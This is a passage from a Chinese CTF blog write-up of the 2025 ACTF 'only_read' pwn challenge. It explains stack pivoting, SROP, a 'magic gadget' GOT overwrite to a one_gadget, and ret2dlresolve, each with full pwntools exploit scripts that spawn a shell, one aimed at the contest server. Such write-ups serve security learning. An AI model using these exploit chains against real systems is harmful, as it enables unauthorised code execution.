+<h4 id="最终EXP"><a href="#最终EXP" class="headerlink" title="最终EXP"></a>最终EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&quot;1.95.199.251&quot;,9999)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">con</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Submit the token generated by `&quot;</span>)</span><br><span class="line">    key=io.recvuntil(<span class="string">b&quot;`&quot;</span>)[:-<span class="number">1</span>]</span><br><span class="line">    token = os.popen(key.decode()).read().strip().encode()</span><br><span class="line">    io.sendline(token)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Here is your challenge~&quot;</span>)</span><br><span class="line"><span class="comment">#con()</span></span><br><span class="line">bss=<span class="number">0x404800</span></span><br><span class="line">got=<span class="number">0x404000</span><span class="comment">#--&gt;0x5f</span></span><br><span class="line">read=<span class="number">0x401142</span></span><br><span class="line">leave=<span class="number">0x40115D</span></span><br><span class="line">tar=<span class="number">0x404088</span></span><br><span class="line">t2=<span class="number">0x404880</span></span><br><span class="line">t3=<span class="number">0x404888</span></span><br><span class="line">eax=<span class="number">0x401158</span></span><br><span class="line">rbp=<span class="number">0x40111D</span></span><br><span class="line"><span class="comment">#==============================================================</span></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x80</span>+p64(tar+<span class="number">0x80</span>-<span class="number">0x8</span>)+p64(read)</span><br><span class="line">bug()</span><br><span class="line">io.send(payload)</span><br><span class="line">pause()</span><br><span class="line">payload=p64(bss+<span class="number">0x100</span>-<span class="number">0x88</span>)+p64(leave)</span><br><span class="line">payload=payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(bss-<span class="number">0x100</span>)+p64(read)</span><br><span class="line">io.send(payload)</span><br><span class="line">pause()</span><br><span class="line">bug()</span><br><span class="line"><span class="comment">#===============================================================</span></span><br><span class="line">s=SigreturnFrame()</span><br><span class="line">bin_sh=<span class="number">0x404718</span></span><br><span class="line">s.rax=<span class="number">0x3b</span></span><br><span class="line">s.rdi=bin_sh</span><br><span class="line">s.rdx=<span class="number">0</span></span><br><span class="line">s.rsi=<span class="number">0</span></span><br><span class="line">s.rip=<span class="number">0x401044</span></span><br><span class="line">payload =p64(bss).ljust(<span class="number">0x80</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(got+<span class="number">0x80</span>)+p64(read)+p64(leave)</span><br><span class="line">payload+=<span class="string">b&quot;/bin/sh\x00&quot;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x160</span>+p64(rbp)+p64(<span class="number">0xf</span>+<span class="number">0x80</span>)+p64(read)+<span class="built_in">bytes</span>(s)[<span class="number">8</span>:]</span><br><span class="line">io.send(payload)</span><br><span class="line">pause()</span><br><span class="line">io.send(<span class="string">b&#x27;\x5f&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>本身用来限制我们<code>read_syscall</code>而间接引用的<code>rax</code>最终反而被我们反向利用,成为了<code>Sigreturn</code>的关键</p>
+<p>不得不说是一种幸运啊  <em>:)</em></p>
+<h3 id="Magic-gadget的高阶用法"><a href="#Magic-gadget的高阶用法" class="headerlink" title="Magic_gadget的高阶用法"></a>Magic_gadget的高阶用法</h3><p>在星盟的博客上闲逛时偶然发现了这个<code>wp</code>,还看到了<code>magic_gadget</code>的身影</p>
+<p>星盟的师傅还是太超标了:  <a target="_blank" rel="noopener" href="https://blog.xmcve.com/2025/04/27/ACTF2025-Writeup/#title-3">星盟wp</a></p>
+<h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><ul>
+<li>magic_gadget</li>
+</ul>
+<p><img src="/images/actf/1749822468618.png" alt="1749822468618"></p>
+<p>一段原本不存在于elf中,通过错位找到的gadget,可以目标地址中的数据进行加减,在我先前的博客中对此有过介绍</p>
+<ul>
+<li>gadget</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0x323b3:</span><br><span class="line">    mov     rsi, [rbp-0x98]</span><br><span class="line">    mov     rdi, [rbp-0x90]</span><br><span class="line">    xor     edx, edx</span><br><span class="line">    mov     [rbp+0x18], eax</span><br><span class="line">    mov     rax, [rbp-0x68]</span><br><span class="line">    lea     rsp, [rbp-0x28]</span><br><span class="line">    pop     rbx</span><br><span class="line">    pop     r12</span><br><span class="line">    pop     r13</span><br><span class="line">    pop     r14</span><br><span class="line">    pop     r15</span><br><span class="line">    pop     rbp</span><br><span class="line">    jmp     rax</span><br></pre></td></tr></table></figure>
+
+<p>在libc库中有着一段和csu非常非常相似的一段gadget,可以控制多个寄存器,只要能调用这个,我们就可以将<code>got</code>写上<code>ogg</code></p>
+<p>然后简简单单<code>getshell</code></p>
+<ul>
+<li>start</li>
+</ul>
+<p>如果我们先将<code>rsp</code>迁移到<code>bss</code>上,然后调用<code>start</code>函数,此时会有两个<code>libc</code>地址被留在<code>bss</code>上</p>
+<p>先将需要用的gadget写好</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">bss=<span class="number">0x404000</span></span><br><span class="line">leave=<span class="number">0x40115D</span></span><br><span class="line">magic=<span class="number">0x40111c</span></span><br><span class="line">rbp=<span class="number">0x40111d</span></span><br><span class="line">target=<span class="number">0x404e08</span></span><br><span class="line">read=<span class="number">0x401142</span></span><br><span class="line"><span class="built_in">str</span>=<span class="number">0x404c88</span></span><br><span class="line">rax=<span class="number">0x401158</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="常规开局"><a href="#常规开局" class="headerlink" title="常规开局"></a>常规开局</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64(bss+<span class="number">0xf00</span>-<span class="number">0x18</span>)+p64(read)</span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure>
+
+<p>这里我们将栈迁移到一个比较高的地址,因为不需要偏移<code>got</code>所以这次的<code>ROP</code>都是写完就用,算是难度降了一个<code>level</code></p>
+<p>至于为什么要把栈迁移到一个比较高的地址,后面会解释</p>
+<h4 id="开始利用"><a href="#开始利用" class="headerlink" title="开始利用"></a>开始利用</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(bss+<span class="number">0xf00</span>)+p64(<span class="number">0x401050</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>+p64(bss+<span class="number">0xf00</span>-<span class="number">0x18</span>-<span class="number">0x80</span>)+p64(leave) <span class="comment">#start</span></span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure>
+
+<p>将返回地址改为<code>leave;ret</code>这样就可以执行此时输入的内容并将<code>rsp</code>拉到<code>bss</code>上,即<code>start</code></p>
+<p>此时我们便将两个<code>libc</code>地址印在<code>bss</code>上</p>
+<h4 id="参数的准备"><a href="#参数的准备" class="headerlink" title="参数的准备"></a>参数的准备</h4><p><img src="/images/actf/1749823861329.png" alt="1749823861329"></p>
+<p>分别是start的返回地址和<code>__libc_start_main+139</code></p>
+<p>返回地址我们需要覆盖所以不能用,而<code>__libc_start_main+139</code>和目标<code>gadget</code>-&gt;<code>0x323b3</code>的距离是</p>
+<p><code>0x2a28b-&gt;0x323b3 is 0x8128 bytes (0x1025 words)</code></p>
+<p>此时的<code>rbx</code>是<code>0x404e80</code>,事实上<code>rbx</code>会被设置为栈迁移后的<code>RSP&amp;0x20</code>的位置(重点)</p>
+<p>二者间的距离大约等于两个<code>rbx//0x10</code>(所以为什么要把<code>RSP</code>设置为一个较高的<code>bss</code>地址)</p>
+<p>那剩下的微量差距该怎么办呢?—&gt;当然是通过覆盖<code>最后8字节</code>将<code>bss</code>上的地址准确重定向到目标<code>gadget</code></p>
+<p>那<code>//0x10</code>该怎么处理呢?—&gt;在使用<code>magic gadget</code>进行重定向时,将<code>rbp</code>与<code>__libc_start_main+139</code>错开一个地址</p>
+<p>这样<code>rbp</code>中的值就是<code>__libc_start_main+139</code>的<code>0x10</code>倍</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0x404e07</span>+<span class="number">0x3d</span>)+p64(magic)*<span class="number">2</span>+p64(rbp)+p64(target-<span class="number">0x100</span>)+p64(read)</span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure>
+
+<p>在调用<code>magic gadget</code>后</p>
+<h4 id="gadget的调用"><a href="#gadget的调用" class="headerlink" title="gadget的调用"></a>gadget的调用</h4><p>继续填入调用调整<code>rbp</code>和<code>read</code>,在目标<code>gadget</code>的低地址处填满<code>ret</code>并将目标<code>gadget</code>使用<code>p8(0xb3)</code>覆盖最后8位</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">one_gadget=<span class="number">0xef52b</span></span><br><span class="line">offset=<span class="number">0x10000000000000000</span>+gadget-libc.sym.read</span><br><span class="line">rop=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(magic)+p64(<span class="number">0</span>)*<span class="number">7</span>+p64(offset)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x404000</span>+<span class="number">0x3d</span>)+p64(rbp+<span class="number">1</span>)+p64(rbp)+p64(<span class="number">0</span>)+p64(rbp)+p64(<span class="number">0x404d40</span>-<span class="number">8</span>)+p64(rax)+p64(rbp)+p64(bss+<span class="number">0x500</span>)+p64(<span class="number">0x401044</span>)</span><br><span class="line">payload=rop.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(rbp+<span class="number">1</span>)*<span class="number">0x10</span>+p8(<span class="number">0xb3</span>)<span class="comment">#rop=8*0x20</span></span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure>
+
+<p>通过通过调试确定对<code>[rax,rsp,rbx,rbp,r12,r13,r14,r15]</code>的填装,最后再次调用<code>magic gadget</code>对<code>got</code>重定向到<code>one gadget</code></p>
+<p>同时我们对 <code>rax</code>进行清空操作(<code>one gadget</code>的约束)</p>
+<p>最后将执行流引导到<code>read</code>上,完成<code>getshell</code></p>
+<h4 id="最终EXP-1"><a href="#最终EXP-1" class="headerlink" title="最终EXP"></a>最终EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">bss=<span class="number">0x404000</span></span><br><span class="line">leave=<span class="number">0x40115D</span></span><br><span class="line">magic=<span class="number">0x40111c</span></span><br><span class="line">rbp=<span class="number">0x40111d</span></span><br><span class="line">target=<span class="number">0x404e08</span></span><br><span class="line">read=<span class="number">0x401142</span></span><br><span class="line">start=<span class="number">0x404c88</span></span><br><span class="line">rax=<span class="number">0x401158</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64(bss+<span class="number">0xf00</span>-<span class="number">0x18</span>)+p64(read)</span><br><span class="line">bug()</span><br><span class="line">io.send(payload)</span><br><span class="line">payload=p64(bss+<span class="number">0xf00</span>)+p64(<span class="number">0x401050</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>+p64(bss+<span class="number">0xf00</span>-<span class="number">0x18</span>-<span class="number">0x80</span>)+p64(leave)</span><br><span class="line">pause()</span><br><span class="line">io.send(payload)</span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0x404e07</span>+<span class="number">0x3d</span>)+p64(magic)*<span class="number">2</span>+p64(rbp)+p64(target-<span class="number">0x100</span>)+p64(read)</span><br><span class="line">io.send(payload)</span><br><span class="line">pause()</span><br><span class="line">offset=<span class="number">0x10000000000000000</span>+<span class="number">0xef52b</span>-libc.sym.read</span><br><span class="line">rop=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(magic)+p64(<span class="number">0</span>)*<span class="number">7</span>+p64(offset)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x404000</span>+<span class="number">0x3d</span>)+p64(rbp+<span class="number">1</span>)+p64(rbp)+p64(<span class="number">0</span>)+p64(rbp)+p64(<span class="number">0x404d40</span>-<span class="number">8</span>)+p64(rax)+p64(rbp)+p64(bss+<span class="number">0x500</span>)+p64(<span class="number">0x401044</span>)</span><br><span class="line">payload=rop.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(rbp+<span class="number">1</span>)*<span class="number">0x10</span>+p8(<span class="number">0xb3</span>)<span class="comment">#rop=8*0x20</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h3><p>田师傅的手笔,还说这是道比较极限的<code>ret2dlresolve</code>,几乎把所有<code>bss</code>都用来伪造各种结构</p>
+<p>解析待补充(<del>主要是主播也不会</del>)</p>
+<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#s=process(&quot;/home/ctf/app&quot;)</span></span><br><span class="line">s=remote(<span class="string">&quot;1.95.199.251&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./only_read&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">leave_ret=<span class="number">0x40115d</span></span><br><span class="line">pivot_read=<span class="number">0x401142</span></span><br><span class="line">plt_load=<span class="number">0x401026</span></span><br><span class="line">bss=<span class="number">0x404a50</span></span><br><span class="line">pivot_offset=<span class="number">0x80</span></span><br><span class="line">s.interactive()</span><br><span class="line">s.send(flat([</span><br><span class="line">    <span class="string">b&quot;a&quot;</span>*<span class="number">0x80</span>,bss+pivot_offset,pivot_read,leave_ret</span><br><span class="line">]))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">rdi_offset=<span class="number">0x10f75b</span></span><br><span class="line">l_addr=rdi_offset-libc.sym.read</span><br><span class="line">r_offset=bss+l_addr*-<span class="number">1</span></span><br><span class="line">fake_link_map_addr=bss+<span class="number">0x100</span></span><br><span class="line">fake_dyn_strtab_addr=fake_link_map_addr+<span class="number">8</span></span><br><span class="line">fake_dyn_symtab_addr=fake_link_map_addr+<span class="number">0x18</span></span><br><span class="line">fake_dyn_rel_addr=fake_link_map_addr+<span class="number">0x28</span></span><br><span class="line">fake_link_map=flat([</span><br><span class="line">    l_addr,</span><br><span class="line">    <span class="number">0</span>,<span class="number">0x400000</span>,                 <span class="comment">#fake_dyn_strtab_addr</span></span><br><span class="line">    <span class="number">0</span>,elf.got.read-<span class="number">8</span>,        <span class="comment">#fake_dyn_symtab_addr</span></span><br><span class="line">    <span class="number">0</span>,fake_link_map_addr+<span class="number">0x38</span>,  <span class="comment">#fake_dyn_rel_addr</span></span><br><span class="line">    r_offset,<span class="number">7</span>,</span><br><span class="line">]).ljust(<span class="number">0x68</span>,<span class="string">b&quot;\x00&quot;</span>)+flat([</span><br><span class="line">    fake_dyn_strtab_addr,fake_dyn_symtab_addr,<span class="string">b&quot;/bin/sh\x00&quot;</span>.ljust(<span class="number">0x80</span>,<span class="string">b&quot;\x00&quot;</span>),fake_dyn_rel_addr</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stage2=flat([</span><br><span class="line">    plt_load,</span><br><span class="line">    fake_link_map_addr,<span class="number">0</span>,</span><br><span class="line">    fake_link_map_addr+<span class="number">0x78</span>,</span><br><span class="line">    plt_load,</span><br><span class="line">    fake_link_map_addr+<span class="number">0x100</span>,<span class="number">0</span>,</span><br><span class="line">])</span><br><span class="line">stage2=stage2.ljust(<span class="number">0x80</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">stage2+=flat([</span><br><span class="line">    bss-<span class="number">8</span>,leave_ret</span><br><span class="line">])</span><br><span class="line">stage2=stage2.ljust(<span class="number">0x100</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">stage2+=fake_link_map</span><br><span class="line"></span><br><span class="line">l_addr=libc.sym.system-libc.sym.read</span><br><span class="line">r_offset=bss+l_addr*-<span class="number">1</span></span><br><span class="line">fake_link_map_addr=bss+<span class="number">0x200</span></span><br><span class="line">fake_dyn_strtab_addr=fake_link_map_addr+<span class="number">8</span></span><br><span class="line">fake_dyn_symtab_addr=fake_link_map_addr+<span class="number">0x18</span></span><br><span class="line">fake_dyn_rel_addr=fake_link_map_addr+<span class="number">0x28</span></span><br><span class="line">fake_link_map2=flat([</span><br><span class="line">    l_addr,</span><br><span class="line">    <span class="number">0</span>,<span class="number">0x400000</span>,                 <span class="comment">#fake_dyn_strtab_addr</span></span><br><span class="line">    <span class="number">0</span>,elf.got.read-<span class="number">8</span>,        <span class="comment">#fake_dyn_symtab_addr</span></span><br><span class="line">    <span class="number">0</span>,fake_link_map_addr+<span class="number">0x38</span>,  <span class="comment">#fake_dyn_rel_addr</span></span><br><span class="line">    r_offset,<span class="number">7</span>,</span><br><span class="line">]).ljust(<span class="number">0x68</span>,<span class="string">b&quot;\x00&quot;</span>)+flat([</span><br><span class="line">    fake_dyn_strtab_addr,fake_dyn_symtab_addr,<span class="string">b&quot;/bin/sh\x00&quot;</span>.ljust(<span class="number">0x80</span>,<span class="string">b&quot;\x00&quot;</span>),fake_dyn_rel_addr</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">stage2+=fake_link_map2</span><br><span class="line"></span><br><span class="line">s.send(stage2)</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/covers/erj.jpg" data-sizes="auto" alt="CNVD-2013-11625" class="lazyload">
+        
+      
+      <a href="/2025/06/11/CNVD-2013-11625%20%20DIR-815%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          CNVD-2013-11625
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+
+
+
+
+</section>
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2020-2025
+      
+      <span class="footer-info-sep rotate"></span>
+      zer00ne
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        23.2k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        01:40
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2025-ACTF-only-read%E7%9A%84%E4%B8%89%E7%A7%8D%E8%A7%A3%E6%B3%95"><span class="toc-number">1.</span> <span class="toc-text">2025 ACTF only_read的三种解法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">| 0 | 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">| 1 | 题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">1.3.</span> <span class="toc-text">| 2 | 解题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BE%AE%E9%87%8F%E5%81%8F%E7%A7%BB-SROP"><span class="toc-number">1.3.1.</span> <span class="toc-text">微量偏移+SROP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E7%9A%84%E5%BC%80%E5%B1%80"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">常规的开局</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E5%B8%83%E7%BD%AE%E5%A4%9A%E6%9D%A1ROP%E9%93%BE"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">开始布置多条ROP链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%BB%E5%B1%80"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">死局?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E7%9A%84%E5%B8%8C%E6%9C%9B"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">最后的希望!!!</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E7%BB%88EXP"><span class="toc-number">1.3.1.5.</span> <span class="toc-text">最终EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Magic-gadget%E7%9A%84%E9%AB%98%E9%98%B6%E7%94%A8%E6%B3%95"><span class="toc-number">1.3.2.</span> <span class="toc-text">Magic_gadget的高阶用法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E5%BC%80%E5%B1%80"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">常规开局</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">开始利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%86%E5%A4%87"><span class="toc-number">1.3.2.4.</span> <span class="toc-text">参数的准备</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gadget%E7%9A%84%E8%B0%83%E7%94%A8"><span class="toc-number">1.3.2.5.</span> <span class="toc-text">gadget的调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E7%BB%88EXP-1"><span 